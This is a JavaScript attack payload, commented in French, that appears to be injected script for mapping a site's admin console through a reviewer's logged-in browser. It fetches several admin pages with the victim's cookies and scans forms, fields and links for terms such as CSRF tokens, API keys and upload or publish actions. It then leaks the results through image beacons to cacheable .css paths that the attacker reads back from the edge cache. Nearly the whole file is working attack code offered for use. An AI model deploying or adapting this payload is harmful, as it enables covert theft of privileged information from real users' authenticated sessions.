/* Vantage - reconnaissance de la console admin.
   Canal de retour : chaque balise force le navigateur du reviewer a demander
   /account.php/v1_<tag>.css, que l'edge met en cache et que l'on relit
   anonymement. Aucune chaine de requete, sinon la clef de cache change. */
(function () {
  function b(t) {
    try { new Image().src = '/account.php/v1_' + t + '.css'; } catch (e) {}
  }
  b('exec');

  var KW = ['pages','page','edit','save','update','publish','content','body','path','home',
            'banner','seize','notice','csrf','token','api_key','textarea','slug','title','html',
            'queue','tip','approve','reject','render','file','search','sql','stories','upload'];

  function probe(url, p) {
    fetch(url, { credentials: 'include' })
      .then(function (r) { b(p + 's' + r.status); return r.text(); })
      .then(function (h) {
        var low = h.toLowerCase();
        KW.forEach(function (k, i) { if (low.indexOf(k) >= 0) b(p + 'k' + i); });

        var d = new DOMParser().parseFromString(h, 'text/html');

        d.querySelectorAll('form').forEach(function (f, i) {
          if (i > 3) return;
          b(p + 'f' + i + 'm' + (f.getAttribute('method') || 'get').toLowerCase());
          KW.forEach(function (k, j) {
            if ((f.getAttribute('action') || '').toLowerCase().indexOf(k) >= 0) b(p + 'f' + i + 'a' + j);
          });
          f.querySelectorAll('input,textarea,select').forEach(function (el) {
            KW.forEach(function (k, j) {
              if ((el.getAttribute('name') || '').toLowerCase().indexOf(k) >= 0) b(p + 'f' + i + 'n' + j);
            });
          });
        });

        d.querySelectorAll('a[href]').forEach(function (a) {
          KW.forEach(function (k, j) {
            if (a.getAttribute('href').toLowerCase().indexOf(k) >= 0) b(p + 'h' + j);
          });
        });
      })
      .catch(function () { b(p + 'err'); });
  }

  probe('/admin/', 'i');
  probe('/admin/review.php', 'r');
  probe('/admin/search.php', 'c');
})();
